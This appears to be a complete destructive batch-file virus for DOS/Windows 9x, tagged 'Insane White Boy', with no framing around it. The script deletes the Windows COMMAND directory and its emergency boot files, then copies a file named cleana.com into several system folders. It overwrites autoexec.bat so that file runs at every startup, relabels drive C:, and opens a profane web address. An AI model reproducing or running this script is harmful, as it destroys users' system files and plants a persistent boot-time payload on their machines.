
COPY %WINDIR%\COMMAND\DELTREE.EXE %WINDIR%          >hi.log 
COPY %WINDIR%\COMMAND\FORMAT.COM %WINDIR%          >hi.log 
DELTREE   /Y C:\WINDOWS\COMMAND\*.*          >hi.log 
DELTREE  /Y C:\WINDOWS\COMMAND\EBD          >hi.log 
COPY c:\progra~1\cleana.com c:\windows\spool          >hi.log 
COPY c:\progra~1\cleana.com c:\windows\help           >hi.log 
COPY c:\progra~1\cleana.com c:\windows\samples          >hi.log 
DEL c:\autoexec.bat          >hi.log 
echo @echo off                    >>c:\autoexec.bat 
echo REM ***Insane White Boy***                    >>c:\autoexec.bat 
echo CALL %WINDIR%\SPOOL\CLEANA.COM                    >>C:\autoexec.bat 
echo label c: WhiteBoy                    >>c:\autoexec.bat 
C:\progra~1\intern~1\iexplore.exe  http://fuckmicrosoft.com
